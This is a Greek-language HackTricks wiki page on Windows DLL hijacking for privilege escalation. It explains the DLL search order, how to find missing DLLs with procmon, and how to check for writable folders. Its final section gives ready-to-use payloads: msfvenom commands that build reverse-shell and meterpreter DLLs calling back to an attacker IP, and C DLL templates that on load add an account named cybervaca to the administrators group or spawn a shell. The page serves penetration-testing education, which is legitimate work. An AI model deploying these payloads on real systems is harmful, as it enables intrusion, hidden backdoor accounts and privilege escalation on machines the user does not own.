# Dll Hijacking

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Συμβουλή bug bounty**: **εγγραφείτε** στο **Intigriti**, μια premium **πλατφόρμα bug bounty που δημιουργήθηκε από hackers, για hackers**! Ελάτε μαζί μας στο [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) σήμερα και αρχίστε να κερδίζετε βραβεία έως **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

## Βασικές Πληροφορίες

Το DLL Hijacking περιλαμβάνει την παραποίηση μιας αξιόπιστης εφαρμογής ώστε να φορτώσει ένα κακόβουλο DLL. Αυτός ο όρος περιλαμβάνει πολλές τακτικές όπως **DLL Spoofing, Injection, και Side-Loading**. Χρησιμοποιείται κυρίως για εκτέλεση κώδικα, επίτευξη επιμονής και, λιγότερο συχνά, κλιμάκωση δικαιωμάτων. Παρά την εστίαση στην κλιμάκωση εδώ, η μέθοδος της παραποίησης παραμένει συνεπής σε όλους τους στόχους.

### Κοινές Τεχνικές

Διάφορες μέθοδοι χρησιμοποιούνται για το DLL hijacking, καθεμία με την αποτελεσματικότητά της ανάλογα με τη στρατηγική φόρτωσης DLL της εφαρμογής:

1. **Αντικατάσταση DLL**: Αντικατάσταση ενός γνήσιου DLL με ένα κακόβουλο, προαιρετικά χρησιμοποιώντας DLL Proxying για να διατηρηθεί η λειτουργικότητα του αρχικού DLL.
2. **Hijacking της Σειράς Αναζήτησης DLL**: Τοποθέτηση του κακόβουλου DLL σε μια διαδρομή αναζήτησης πριν από το νόμιμο, εκμεταλλευόμενοι το μοτίβο αναζήτησης της εφαρμογής.
3. **Phantom DLL Hijacking**: Δημιουργία ενός κακόβουλου DLL για να φορτωθεί από μια εφαρμογή, νομίζοντας ότι είναι ένα ανύπαρκτο απαιτούμενο DLL.
4. **DLL Redirection**: Τροποποίηση παραμέτρων αναζήτησης όπως το `%PATH%` ή τα αρχεία `.exe.manifest` / `.exe.local` για να κατευθυνθεί η εφαρμογή στο κακόβουλο DLL.
5. **Αντικατάσταση DLL WinSxS**: Αντικατάσταση του νόμιμου DLL με ένα κακόβουλο αντίστοιχο στον κατάλογο WinSxS, μια μέθοδος που συχνά σχετίζεται με το DLL side-loading.
6. **Relative Path DLL Hijacking**: Τοποθέτηση του κακόβουλου DLL σε έναν κατάλογο που ελέγχεται από τον χρήστη με την αντιγραμμένη εφαρμογή, που μοιάζει με τις τεχνικές Binary Proxy Execution.

## Εύρεση Ελλειπόντων DLLs

Ο πιο κοινός τρόπος για να βρείτε ελλείποντα DLLs σε ένα σύστημα είναι να εκτελέσετε [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) από sysinternals, **ορίζοντας** τα **εξής 2 φίλτρα**:

![](<../../../.gitbook/assets/image (961).png>)

![](<../../../.gitbook/assets/image (230).png>)

και να δείξετε μόνο τη **Δραστηριότητα Συστήματος Αρχείων**:

![](<../../../.gitbook/assets/image (153).png>)

Αν ψάχνετε για **ελλείποντα dlls γενικά** μπορείτε να **αφήσετε** αυτό να τρέχει για μερικά **δευτερόλεπτα**.\
Αν ψάχνετε για ένα **ελλείπον dll μέσα σε μια συγκεκριμένη εκτελέσιμη** θα πρέπει να ορίσετε **ένα άλλο φίλτρο όπως "Process Name" "contains" "\<exec name>", να το εκτελέσετε και να σταματήσετε την καταγραφή γεγονότων**.

## Εκμετάλλευση Ελλειπόντων DLLs

Για να κλιμακώσουμε δικαιώματα, η καλύτερη ευκαιρία που έχουμε είναι να μπορέσουμε να **γράψουμε ένα dll που μια διαδικασία με δικαιώματα θα προσπαθήσει να φορτώσει** σε κάποιο **μέρος όπου θα αναζητηθεί**. Επομένως, θα μπορέσουμε να **γράψουμε** ένα dll σε έναν **φάκελο** όπου το **dll αναζητείται πριν** από τον φάκελο όπου βρίσκεται το **αρχικό dll** (παράξενος περίπτωση), ή θα μπορέσουμε να **γράψουμε σε κάποιο φάκελο όπου το dll θα αναζητηθεί** και το αρχικό **dll δεν υπάρχει** σε κανέναν φάκελο.

### Σειρά Αναζήτησης DLL

**Μέσα στην** [**τεκμηρίωση της Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **μπορείτε να βρείτε πώς φορτώνονται συγκεκριμένα τα DLLs.**

**Οι εφαρμογές Windows** αναζητούν DLLs ακολουθώντας μια σειρά από **προκαθορισμένες διαδρομές αναζήτησης**, τηρώντας μια συγκεκριμένη ακολουθία. Το ζήτημα του DLL hijacking προκύπτει όταν ένα επιβλαβές DLL τοποθετείται στρατηγικά σε έναν από αυτούς τους καταλόγους, διασφαλίζοντας ότι θα φορτωθεί πριν από το αυθεντικό DLL. Μια λύση για να αποτραπεί αυτό είναι να διασφαλιστεί ότι η εφαρμογή χρησιμοποιεί απόλυτες διαδρομές όταν αναφέρεται στα DLLs που απαιτεί.

Μπορείτε να δείτε τη **σειρά αναζήτησης DLL σε 32-bit** συστήματα παρακάτω:

1. Ο κατάλογος από τον οποίο φορτώθηκε η εφαρμογή.
2. Ο κατάλογος συστήματος. Χρησιμοποιήστε τη [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) συνάρτηση για να αποκτήσετε τη διαδρομή αυτού του καταλόγου.(_C:\Windows\System32_)
3. Ο 16-bit κατάλογος συστήματος. Δεν υπάρχει συνάρτηση που να αποκτά τη διαδρομή αυτού του καταλόγου, αλλά αναζητείται. (_C:\Windows\System_)
4. Ο κατάλογος των Windows. Χρησιμοποιήστε τη [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) συνάρτηση για να αποκτήσετε τη διαδρομή αυτού του καταλόγου.
1. (_C:\Windows_)
5. Ο τρέχων κατάλογος.
6. Οι κατάλογοι που αναφέρονται στη μεταβλητή περιβάλλοντος PATH. Σημειώστε ότι αυτό δεν περιλαμβάνει τη διαδρομή ανά εφαρμογή που καθορίζεται από το κλειδί μητρώου **App Paths**. Το κλειδί **App Paths** δεν χρησιμοποιείται κατά τον υπολογισμό της διαδρομής αναζήτησης DLL.

Αυτή είναι η **προεπιλεγμένη** σειρά αναζήτησης με ενεργοποιημένο το **SafeDllSearchMode**. Όταν είναι απενεργοποιημένο, ο τρέχων κατάλογος ανεβαίνει στη δεύτερη θέση. Για να απενεργοποιήσετε αυτή τη δυνατότητα, δημιουργήστε την τιμή μητρώου **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** και ορίστε την σε 0 (η προεπιλογή είναι ενεργοποιημένη).

Αν η συνάρτηση [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) κληθεί με **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, η αναζήτηση αρχίζει στον κατάλογο του εκτελέσιμου module που **φορτώνει το LoadLibraryEx**.

Τέλος, σημειώστε ότι **ένα dll θα μπορούσε να φορτωθεί υποδεικνύοντας την απόλυτη διαδρομή αντί μόνο το όνομα**. Σε αυτή την περίπτωση, το dll θα **αναζητηθεί μόνο σε αυτή τη διαδρομή** (αν το dll έχει εξαρτήσεις, αυτές θα αναζητηθούν όπως φορτώθηκαν μόνο με το όνομα).

Υπάρχουν άλλοι τρόποι για να τροποποιήσετε τις μεθόδους αναζήτησης, αλλά δεν θα τους εξηγήσω εδώ.

#### Εξαιρέσεις στη σειρά αναζήτησης DLL από τα Windows docs

Ορισμένες εξαιρέσεις από τη стандартική σειρά αναζήτησης DLL σημειώνονται στην τεκμηρίωση των Windows:

* Όταν συναντηθεί ένα **DLL που μοιράζεται το όνομά του με ένα ήδη φορτωμένο στη μνήμη**, το σύστημα παρακάμπτει την συνήθη αναζήτηση. Αντίθετα, εκτελεί έναν έλεγχο για ανακατεύθυνση και ένα μανιφέστο πριν επιστρέψει στο DLL που είναι ήδη στη μνήμη. **Σε αυτό το σενάριο, το σύστημα δεν διεξάγει αναζήτηση για το DLL**.
* Σε περιπτώσεις όπου το DLL αναγνωρίζεται ως **γνωστό DLL** για την τρέχουσα έκδοση των Windows, το σύστημα θα χρησιμοποιήσει την έκδοση του γνωστού DLL, μαζί με οποιαδήποτε από τα εξαρτώμενα DLL του, **παρακάμπτοντας τη διαδικασία αναζήτησης**. Το κλειδί μητρώου **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** περιέχει μια λίστα με αυτά τα γνωστά DLLs.
* Αν ένα **DLL έχει εξαρτήσεις**, η αναζήτηση για αυτά τα εξαρτώμενα DLLs διεξάγεται σαν να υποδεικνύονταν μόνο με τα **ονόματα των modules**, ανεξάρτητα από το αν το αρχικό DLL αναγνωρίστηκε μέσω πλήρους διαδρομής.

### Κλιμάκωση Δικαιωμάτων

**Απαιτήσεις**:

* Εντοπίστε μια διαδικασία που λειτουργεί ή θα λειτουργήσει με **διαφορετικά δικαιώματα** (οριζόντια ή πλευρική κίνηση), η οποία **λείπει ένα DLL**.
* Διασφαλίστε ότι υπάρχει **δικαίωμα εγγραφής** για οποιονδήποτε **κατάλογο** στον οποίο θα **αναζητηθεί το DLL**. Αυτή η τοποθεσία μπορεί να είναι ο κατάλογος του εκτελέσιμου ή ένας κατάλογος εντός της διαδρομής του συστήματος.

Ναι, οι απαιτήσεις είναι δύσκολο να βρεθούν καθώς **κατά προεπιλογή είναι κάπως παράξενο να βρείτε ένα εκτελέσιμο με δικαιώματα που να λείπει ένα dll** και είναι ακόμη **πιο παράξενο να έχετε δικαιώματα εγγραφής σε έναν φάκελο διαδρομής συστήματος** (δεν μπορείτε κατά προεπιλογή). Αλλά, σε κακώς ρυθμισμένα περιβάλλοντα αυτό είναι δυνατό.\
Σε περίπτωση που είστε τυχεροί και πληροίτε τις απαιτήσεις, μπορείτε να ελέγξετε το έργο [UACME](https://github.com/hfiref0x/UACME). Ακόμη και αν ο **κύριος στόχος του έργου είναι η παράκαμψη του UAC**, μπορεί να βρείτε εκεί μια **PoC** ενός Dll hijacking για την έκδοση των Windows που μπορείτε να χρησιμοποιήσετε (πιθανώς αλλάζοντας απλώς τη διαδρομή του φακέλου όπου έχετε δικαιώματα εγγραφής).

Σημειώστε ότι μπορείτε να **ελέγξετε τα δικαιώματά σας σε έναν φάκελο** κάνοντας:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Και **έλεγξε τα δικαιώματα όλων των φακέλων μέσα στο PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Μπορείτε επίσης να ελέγξετε τις εισαγωγές ενός εκτελέσιμου και τις εξαγωγές μιας dll με:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Για έναν πλήρη οδηγό σχετικά με το πώς να **καταχραστείτε το Dll Hijacking για να κερδίσετε δικαιώματα** με άδειες εγγραφής σε έναν **φάκελο System Path** ελέγξτε:

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Αυτοματοποιημένα εργαλεία

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) θα ελέγξει αν έχετε άδειες εγγραφής σε οποιονδήποτε φάκελο μέσα στο system PATH.\
Άλλα ενδιαφέροντα αυτοματοποιημένα εργαλεία για την ανακάλυψη αυτής της ευπάθειας είναι οι **λειτουργίες PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ και _Write-HijackDll._

### Παράδειγμα

Σε περίπτωση που βρείτε ένα εκμεταλλεύσιμο σενάριο, ένα από τα πιο σημαντικά πράγματα για να το εκμεταλλευτείτε επιτυχώς θα ήταν να **δημιουργήσετε μια dll που εξάγει τουλάχιστον όλες τις λειτουργίες που θα εισάγει το εκτελέσιμο από αυτήν**. Ούτως ή άλλως, σημειώστε ότι το Dll Hijacking είναι χρήσιμο για να [ανεβείτε από το Medium Integrity level σε High **(παρακάμπτοντας το UAC)**](../../authentication-credentials-uac-and-efs/#uac) ή από [**High Integrity σε SYSTEM**](../#from-high-integrity-to-system)**.** Μπορείτε να βρείτε ένα παράδειγμα για **πώς να δημιουργήσετε μια έγκυρη dll** μέσα σε αυτή τη μελέτη dll hijacking που επικεντρώνεται στο dll hijacking για εκτέλεση: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Επιπλέον, στην **επόμενη ενότητα** μπορείτε να βρείτε μερικούς **βασικούς κωδικούς dll** που μπορεί να είναι χρήσιμοι ως **πρότυπα** ή για να δημιουργήσετε μια **dll με μη απαιτούμενες εξαγόμενες λειτουργίες**.

## **Δημιουργία και μεταγλώττιση Dlls**

### **Dll Proxifying**

Βασικά, μια **Dll proxy** είναι μια Dll ικανή να **εκτελεί τον κακόβουλο κώδικά σας όταν φορτωθεί** αλλά και να **εκθέτει** και να **λειτουργεί** όπως **αναμένεται** **αναμεταδίδοντας όλες τις κλήσεις στη πραγματική βιβλιοθήκη**.

Με το εργαλείο [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) ή [**Spartacus**](https://github.com/Accenture/Spartacus) μπορείτε στην πραγματικότητα να **υποδείξετε ένα εκτελέσιμο και να επιλέξετε τη βιβλιοθήκη** που θέλετε να proxify και να **δημιουργήσετε μια proxified dll** ή να **υποδείξετε τη Dll** και να **δημιουργήσετε μια proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Αποκτήστε ένα meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Δημιουργήστε έναν χρήστη (x86 δεν είδα μια x64 έκδοση):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Your own

Σημειώστε ότι σε πολλές περιπτώσεις η Dll που θα συντάξετε πρέπει να **εξάγει πολλές συναρτήσεις** που θα φορτωθούν από τη διαδικασία του θύματος, αν αυτές οι συναρτήσεις δεν υπάρχουν, το **δυαδικό αρχείο δεν θα μπορέσει να τις φορτώσει** και η **εκμετάλλευση θα αποτύχει**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## Αναφορές

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**Συμβουλή για bug bounty**: **εγγραφείτε** στο **Intigriti**, μια premium **πλατφόρμα bug bounty που δημιουργήθηκε από hackers, για hackers**! Ελάτε μαζί μας στο [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) σήμερα, και αρχίστε να κερδίζετε βραβεία έως **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστηρίξτε το HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Ελάτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
